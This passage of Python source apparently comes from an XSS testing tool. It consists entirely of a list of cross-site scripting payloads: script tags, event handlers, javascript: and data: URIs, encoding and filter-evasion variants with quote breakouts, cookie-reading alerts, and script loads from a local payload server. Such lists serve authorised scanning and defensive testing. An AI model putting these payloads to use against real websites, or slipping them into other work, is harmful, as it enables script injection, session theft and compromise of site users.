             '\'><HTML xmlns:X><?import namespace="X" implementation="%(htc)s"><X:X>X</X:X></HTML>""","XML namespace."),("""<XML ID="X"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '"><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '\'><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
             '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">',
             '"><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">',
             '\'><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="X&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>',
             '<SCRIPT SRC="%(jpg)s"></SCRIPT>', '"><SCRIPT SRC="%(jpg)s"></SCRIPT>',
             '\'><SCRIPT SRC="%(jpg)s"></SCRIPT>',
             '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-',
             '"><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-',
             '\'><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-',
             '<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X',
             '"><form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X',
             '\'><form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X',
             '<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
             '"><body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>',
             "'><body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
             '<P STYLE="behavior:url(\'#default#time2\')" end="0" onEnd="javascript:alert(1)">',
             '"><P STYLE="behavior:url(\'#default#time2\')" end="0" onEnd="javascript:alert(1)">',
             '\'><P STYLE="behavior:url(\'#default#time2\')" end="0" onEnd="javascript:alert(1)">',
             "<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>",
             '"><STYLE>a{background:url(\'s1\' \'s2)}@import javascript:javascript:alert(1);\');}</STYLE>',
             "'><STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>",
             '<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>',
             '"><meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>',
             '\'><meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>',
             '<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>',
             '"><SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>',
             "'><SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>",
             '<style onreadystatechange=javascript:javascript:alert(1);></style>',
             '"><style onreadystatechange=javascript:javascript:alert(1);></style>',
             "'><style onreadystatechange=javascript:javascript:alert(1);></style>",
             '<?xml version="1.0"?><html:html xmlns:html=\'http://www.w3.org/1999/xhtml\'><html:script>javascript:alert(1);</html:script></html:html>',
             '"><?xml version="1.0"?><html:html xmlns:html=\'http://www.w3.org/1999/xhtml\'><html:script>javascript:alert(1);</html:script></html:html>',
             '\'><?xml version="1.0"?><html:html xmlns:html=\'http://www.w3.org/1999/xhtml\'><html:script>javascript:alert(1);</html:script></html:html>',
             '<embed code=%(scriptlet)s></embed>', '"><embed code=%(scriptlet)s></embed>',
             "'><embed code=%(scriptlet)s></embed>", '<embed code=javascript:javascript:alert(1);></embed>',
             '"><embed code=javascript:javascript:alert(1);></embed>',
             "'><embed code=javascript:javascript:alert(1);></embed>", '<embed src=%(jscript)s></embed>',
             '"><embed src=%(jscript)s></embed>', "'><embed src=%(jscript)s></embed>",
             '<frameset onload=javascript:javascript:alert(1)></frameset>',
             '"><frameset onload=javascript:javascript:alert(1)></frameset>',
             "'><frameset onload=javascript:javascript:alert(1)></frameset>",
             '<object onerror=javascript:javascript:alert(1)>', '"><object onerror=javascript:javascript:alert(1)>',
             "'><object onerror=javascript:javascript:alert(1)>", '<embed type="image" src=%(scriptlet)s></embed>',
             '"><embed type="image" src=%(scriptlet)s></embed>', '\'><embed type="image" src=%(scriptlet)s></embed>',
             '<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>',
             '"><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>',
             '\'><XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:javascript:alert(1);">]]</C><X></xml>',
             '<IMG SRC=&{javascript:alert(1);};>', '"><IMG SRC=&{javascript:alert(1);};>',
             "'><IMG SRC=&{javascript:alert(1);};>", '<a href="jav&#65ascript:javascript:alert(1)">test1</a>',
             '"><a href="jav&#65ascript:javascript:alert(1)">test1</a>',
             '\'><a href="jav&#65ascript:javascript:alert(1)">test1</a>',
             '<a href="jav&#97ascript:javascript:alert(1)">test1</a>',
             '"><a href="jav&#97ascript:javascript:alert(1)">test1</a>',
             '\'><a href="jav&#97ascript:javascript:alert(1)">test1</a>',
             '<embed width=500 height=500 code="data:text/html,<script>%(payload)s</script>',
             '</ScrIpt><script>%(payload)s</script>', '"><script>%(payload)s</script>',
             '</ScrIpt><script>%(payload)s</script>', "'><script>%(payload)s</script>",
             '</ScrIpt><script>%(payload)s</script>"></embed>',
             '<iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">',
             '"><iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">',
             '\'><iframe srcdoc="&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>">',
             'alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//--',
             '></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
             '<SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>',
             '"><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>',
             "'><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>",
             '<SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>',
             '"><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>',
             "'><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>",
             '<IMG SRC="javascript:alert(\'X\');">', '"><IMG SRC="javascript:alert(\'X\');">',
             '\'><IMG SRC="javascript:alert(\'X\');">', "<IMG SRC=javascript:alert('X')>",
             '"><IMG SRC=javascript:alert(\'X\')>', "'><IMG SRC=javascript:alert('X')>",
             "<IMG SRC=JaVaScRiPt:alert('X')>", '"><IMG SRC=JaVaScRiPt:alert(\'X\')>',
             "'><IMG SRC=JaVaScRiPt:alert('X')>", '<IMG SRC=javascript:alert("X")>',
             '"><IMG SRC=javascript:alert("X")>', '\'><IMG SRC=javascript:alert("X")>',
             '<IMG SRC=`javascript:alert("X says, \'X\'")`>', '"><IMG SRC=`javascript:alert("X says, \'X\'")`>',
             '\'><IMG SRC=`javascript:alert("X says, \'X\'")`>', '<a onmouseover="alert(document.cookie)">X link</a>',
             '"><a onmouseover="alert(document.cookie)">X link</a>',
             '\'><a onmouseover="alert(document.cookie)">X link</a>',
             '<a onmouseover=alert(document.cookie)>X link</a>', '"><a onmouseover=alert(document.cookie)>X link</a>',
             "'><a onmouseover=alert(document.cookie)>X link</a>", '<IMG """><SCRIPT>alert("X")</SCRIPT>">',
             '"><IMG """><SCRIPT>alert("X")</SCRIPT>">', '\'><IMG """><SCRIPT>alert("X")</SCRIPT>">',
             '<IMG SRC= onmouseover="alert(\'X\')">', '"><IMG SRC= onmouseover="alert(\'X\')">',
             '\'><IMG SRC= onmouseover="alert(\'X\')">', '<IMG onmouseover="alert(\'X\')">',
             '"><IMG onmouseover="alert(\'X\')">', '\'><IMG onmouseover="alert(\'X\')">',
             '<IMG SRC="jav&#x09;ascript:alert(\'X\');">', '"><IMG SRC="jav&#x09;ascript:alert(\'X\');">',
             '\'><IMG SRC="jav&#x09;ascript:alert(\'X\');">', '<IMG SRC="jav&#x0D;ascript:alert(\'X\');">',
             '"><IMG SRC="jav&#x0D;ascript:alert(\'X\');">', '\'><IMG SRC="jav&#x0D;ascript:alert(\'X\');">',
             'perl -e \'print "<IMG SRC=java\\0script:alert(\\"X\\")>";\' > out',
             '<IMG SRC=" &#14;  javascript:alert(\'X\');">', '"><IMG SRC=" &#14;  javascript:alert(\'X\');">',
             '\'><IMG SRC=" &#14;  javascript:alert(\'X\');">',
             '<SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT/X SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT/SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<<SCRIPT>alert("X");//<</SCRIPT>', '"><<SCRIPT>alert("X");//<</SCRIPT>',
             '\'><<SCRIPT>alert("X");//<</SCRIPT>', '<SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js< B >',
             '"><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js< B >',
             "'><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js< B >",
             '<SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp< B >',
             '"><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp< B >',
             "'><SCRIPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp< B >",
             '<SCRIPT SRC=//127.0.0.1:3555/xss_serve_payloads/.j>',
             '"><SCRIPT SRC=//127.0.0.1:3555/xss_serve_payloads/.j>',
             "'><SCRIPT SRC=//127.0.0.1:3555/xss_serve_payloads/.j>", '<IMG SRC="javascript:alert(\'X\')"',
             '"><IMG SRC="javascript:alert(\'X\')"', '\'><IMG SRC="javascript:alert(\'X\')"',
             '</TITLE><SCRIPT>alert("X");</SCRIPT>', '"></TITLE><SCRIPT>alert("X");</SCRIPT>',
             '\'></TITLE><SCRIPT>alert("X");</SCRIPT>', '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'X\');">',
             '"><INPUT TYPE="IMAGE" SRC="javascript:alert(\'X\');">',
             '\'><INPUT TYPE="IMAGE" SRC="javascript:alert(\'X\');">', '<BODY BACKGROUND="javascript:alert(\'X\')">',
             '"><BODY BACKGROUND="javascript:alert(\'X\')">', '\'><BODY BACKGROUND="javascript:alert(\'X\')">',
             '<IMG DYNSRC="javascript:alert(\'X\')">', '"><IMG DYNSRC="javascript:alert(\'X\')">',
             '\'><IMG DYNSRC="javascript:alert(\'X\')">', '<IMG LOWSRC="javascript:alert(\'X\')">',
             '"><IMG LOWSRC="javascript:alert(\'X\')">', '\'><IMG LOWSRC="javascript:alert(\'X\')">',
             '<STYLE>li {list-style-image: url("javascript:alert(\'X\')");}</STYLE><UL><LI>X</br>',
             '"><STYLE>li {list-style-image: url("javascript:alert(\'X\')");}</STYLE><UL><LI>X</br>',
             '\'><STYLE>li {list-style-image: url("javascript:alert(\'X\')");}</STYLE><UL><LI>X</br>',
             '<IMG SRC=\'vbscript:msgbox("X")\'>', '"><IMG SRC=\'vbscript:msgbox("X")\'>',
             '\'><IMG SRC=\'vbscript:msgbox("X")\'>', '<IMG SRC="livescript:[code]">',
             '"><IMG SRC="livescript:[code]">', '\'><IMG SRC="livescript:[code]">', "<BODY ONLOAD=alert('X')>",
             '"><BODY ONLOAD=alert(\'X\')>', "'><BODY ONLOAD=alert('X')>", '<BGSOUND SRC="javascript:alert(\'X\');">',
             '"><BGSOUND SRC="javascript:alert(\'X\');">', '\'><BGSOUND SRC="javascript:alert(\'X\');">',
             '<BR SIZE="&{alert(\'X\')}">', '"><BR SIZE="&{alert(\'X\')}">', '\'><BR SIZE="&{alert(\'X\')}">',
             '<LINK REL="stylesheet" HREF="javascript:alert(\'X\');">',
             '"><LINK REL="stylesheet" HREF="javascript:alert(\'X\');">',
             '\'><LINK REL="stylesheet" HREF="javascript:alert(\'X\');">',
             '<STYLE>BODY{-moz-binding:url("http://127.0.0.1:3555/xss_serve_payloads/X.xml#X")}</STYLE>',
             '"><STYLE>BODY{-moz-binding:url("http://127.0.0.1:3555/xss_serve_payloads/X.xml#X")}</STYLE>',
             '\'><STYLE>BODY{-moz-binding:url("http://127.0.0.1:3555/xss_serve_payloads/X.xml#X")}</STYLE>',
             '<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("X")\';</STYLE>',
             '"><STYLE>@im\\port\'\\ja\\vasc\\ript:alert("X")\';</STYLE>',
             '\'><STYLE>@im\\port\'\\ja\\vasc\\ript:alert("X")\';</STYLE>',
             '<IMG STYLE="X:expr/*X*/ession(alert(\'X\'))">', '"><IMG STYLE="X:expr/*X*/ession(alert(\'X\'))">',
             '\'><IMG STYLE="X:expr/*X*/ession(alert(\'X\'))">', '<STYLE TYPE="text/javascript">alert(\'X\');</STYLE>',
             '"><STYLE TYPE="text/javascript">alert(\'X\');</STYLE>',
             '\'><STYLE TYPE="text/javascript">alert(\'X\');</STYLE>',
             '<STYLE>.X{background-image:url("javascript:alert(\'X\')");}</STYLE><A CLASS=X></A>',
             '"><STYLE>.X{background-image:url("javascript:alert(\'X\')");}</STYLE><A CLASS=X></A>',
             '\'><STYLE>.X{background-image:url("javascript:alert(\'X\')");}</STYLE><A CLASS=X></A>',
             '"><A CLASS=X></A>', "'><A CLASS=X></A>",
             '<STYLE type="text/css">BODY{background:url("javascript:alert(\'X\')")}</STYLE>',
             '"><STYLE type="text/css">BODY{background:url("javascript:alert(\'X\')")}</STYLE>',
             '\'><STYLE type="text/css">BODY{background:url("javascript:alert(\'X\')")}</STYLE>',
             '<X STYLE="X:expression(alert(\'X\'))">', '"><X STYLE="X:expression(alert(\'X\'))">',
             '\'><X STYLE="X:expression(alert(\'X\'))">', '<X STYLE="behavior: url(X.htc);">',
             '"><X STYLE="behavior: url(X.htc);">', '\'><X STYLE="behavior: url(X.htc);">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'X\');">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'X\');">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'X\');">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'X\');">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'X\');">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'X\');">',
             '<IFRAME SRC="javascript:alert(\'X\');"></IFRAME>', '"><IFRAME SRC="javascript:alert(\'X\');"></IFRAME>',
             '\'><IFRAME SRC="javascript:alert(\'X\');"></IFRAME>',
             '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
             '"><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
             '\'><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
             '<FRAMESET><FRAME SRC="javascript:alert(\'X\');"></FRAMESET>',
             '"><FRAMESET><FRAME SRC="javascript:alert(\'X\');"></FRAMESET>',
             '\'><FRAMESET><FRAME SRC="javascript:alert(\'X\');"></FRAMESET>',
             '<TABLE BACKGROUND="javascript:alert(\'X\')">', '"><TABLE BACKGROUND="javascript:alert(\'X\')">',
             '\'><TABLE BACKGROUND="javascript:alert(\'X\')">', '<TABLE><TD BACKGROUND="javascript:alert(\'X\')">',
             '"><TABLE><TD BACKGROUND="javascript:alert(\'X\')">',
             '\'><TABLE><TD BACKGROUND="javascript:alert(\'X\')">',
             '<DIV STYLE="background-image: url(javascript:alert(\'X\'))">',
             '"><DIV STYLE="background-image: url(javascript:alert(\'X\'))">',
             '\'><DIV STYLE="background-image: url(javascript:alert(\'X\'))">',
             '<DIV STYLE="background-image: url(&#1;javascript:alert(\'X\'))">',
             '"><DIV STYLE="background-image: url(&#1;javascript:alert(\'X\'))">',
             '\'><DIV STYLE="background-image: url(&#1;javascript:alert(\'X\'))">',
             '<DIV STYLE="width: expression(alert(\'X\'));">', '"><DIV STYLE="width: expression(alert(\'X\'));">',
             '\'><DIV STYLE="width: expression(alert(\'X\'));">', '<BASE HREF="javascript:alert(\'X\');//">',
             '"><BASE HREF="javascript:alert(\'X\');//">', '\'><BASE HREF="javascript:alert(\'X\');//">',
             '<object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/X.js"></object>',
             '"><object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/X.js"></object>',
             '\'><object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/X.js"></object>',
             '<object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></object>',
             '"><object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></object>',
             '\'><object type="text/x-scriptlet" data="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></object>',
             '<OBJECT TYPE="text/x-scriptlet" DATA="http://127.0.0.1:3555/xss_serve_payloads/X.html"></OBJECT>',
             '"><OBJECT TYPE="text/x-scriptlet" DATA="http://127.0.0.1:3555/xss_serve_payloads/X.html"></OBJECT>',
             '\'><OBJECT TYPE="text/x-scriptlet" DATA="http://127.0.0.1:3555/xss_serve_payloads/X.html"></OBJECT>',
             '<EMBED SRC="data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '"><EMBED SRC="data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '\'><EMBED SRC="data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '<SCRIPT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.jpg"></SCRIPT>',
             '"><SCRIPT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.jpg"></SCRIPT>',
             '\'><SCRIPT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.jpg"></SCRIPT>',
             '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>\'"-->',
             '"><!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>\'"-->',
             '\'><!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js></SCRIPT>\'"-->',
             '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>\'"-->',
             '"><!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>\'"-->',
             '\'><!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></SCRIPT>\'"-->',
             '<? echo(\'<SCR)\';echo(\'IPT>alert("X")</SCRIPT>\'); ?>',
             '"><? echo(\'<SCR)\';echo(\'IPT>alert("X")</SCRIPT>\'); ?>',
             '\'><? echo(\'<SCR)\';echo(\'IPT>alert("X")</SCRIPT>\'); ?>',
             'Redirect 302 /axaaX.jpg http://127.0.0.1:3555/xss_serve_payloads/X.html',
             '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'X\')</SCRIPT>">',
             '"><META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'X\')</SCRIPT>">',
             '\'><META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'X\')</SCRIPT>">',
             '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'X\');+ADw-/SCRIPT+AD4-',
             '"><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'X\');+ADw-/SCRIPT+AD4-',
             '\'><HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'X\');+ADw-/SCRIPT+AD4-',
             '<A HREF="http://127.0.0.1/">X</A>', '"><A HREF="http://127.0.0.1/">X</A>',
             '\'><A HREF="http://127.0.0.1/">X</A>', '<A HREF="http://0x42.0x0000066.0x7.0x93/">X</A>',
             '"><A HREF="http://0x42.0x0000066.0x7.0x93/">X</A>', '\'><A HREF="http://0x42.0x0000066.0x7.0x93/">X</A>',
             '<A HREF="http://0102.0146.0007.00000223/">X</A>', '"><A HREF="http://0102.0146.0007.00000223/">X</A>',
             '\'><A HREF="http://0102.0146.0007.00000223/">X</A>', '<A HREF="htt\tp://6\t6.000146.0x7.147/">X</A>',
             '"><A HREF="htt\tp://6\t6.000146.0x7.147/">X</A>', '\'><A HREF="htt\tp://6\t6.000146.0x7.147/">X</A>',
             '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
             '"><iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
             '\'><iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>',
             "<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
             '"><svg><style>{font-family&colon;\'<iframe/onload=confirm(1)>\'',
             "'><svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'",
             '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
             '"><input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
             '\'><input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
             '<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}', '"><sVg><scRipt %00>alert&lpar;1&rpar; {Opera}',
             "'><sVg><scRipt %00>alert&lpar;1&rpar; {Opera}", '<img/src=`%00` onerror=this.onerror=confirm(1)',
             '"><img/src=`%00` onerror=this.onerror=confirm(1)', "'><img/src=`%00` onerror=this.onerror=confirm(1)",
             '<form><isindex formaction="javascript&colon;confirm(1)"',
             '"><form><isindex formaction="javascript&colon;confirm(1)"',
             '\'><form><isindex formaction="javascript&colon;confirm(1)"',
             '<img src=`%00`&NewLine; onerror=alert(1)&NewLine;', '"><img src=`%00`&NewLine; onerror=alert(1)&NewLine;',
             "'><img src=`%00`&NewLine; onerror=alert(1)&NewLine;",
             "<script/&Tab; src='http://127.0.0.1:3555/xss_serve_payloads/X.js' /&Tab;></script>",
             '"><script/&Tab; src=\'http://127.0.0.1:3555/xss_serve_payloads/X.js\' /&Tab;></script>',
             "'><script/&Tab; src='http://127.0.0.1:3555/xss_serve_payloads/X.js' /&Tab;></script>",
             "<script/&Tab; src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp' /&Tab;></script>",
             '"><script/&Tab; src=\'http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp\' /&Tab;></script>',
             "'><script/&Tab; src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp' /&Tab;></script>",
             '<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?',
             '"><ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?',
             "'><ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?",
             '<iframe/src="data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><iframe/src="data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><iframe/src="data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/',
             '"><script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/',
             "'><script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/",
             "&#34;&#62;<h1/onmouseover='\\u0061lert(1)'>%00",
             '<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">',
             '"><iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">',
             '\'><iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">',
             '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             '"><meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             '\'><meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
             "<svg><script xlink:href=data&colon;,window.open('https://127.0.0.1:3555/xss_serve_payloads/X.html')></script",
             '"><svg><script xlink:href=data&colon;,window.open(\'https://127.0.0.1:3555/xss_serve_payloads/X.html\')></script',
             "'><svg><script xlink:href=data&colon;,window.open('https://127.0.0.1:3555/xss_serve_payloads/X.html')></script",
             "<svg><script x:href='http://127.0.0.1:3555/xss_serve_payloads/X.js'",
             '"><svg><script x:href=\'http://127.0.0.1:3555/xss_serve_payloads/X.js\'',
             "'><svg><script x:href='http://127.0.0.1:3555/xss_serve_payloads/X.js'",
             "<svg><script x:href='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'",
             '"><svg><script x:href=\'http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp\'',
             "'><svg><script x:href='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'",
             '<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
             '"><meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
             '\'><meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
             '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
             '"><iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
             "'><iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
             '<form><a href="javascript:\\u0061lert&#x28;1&#x29;">X',
             '"><form><a href="javascript:\\u0061lert&#x28;1&#x29;">X',
             '\'><form><a href="javascript:\\u0061lert&#x28;1&#x29;">X',
             '</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror=\'eval(src)\'>',
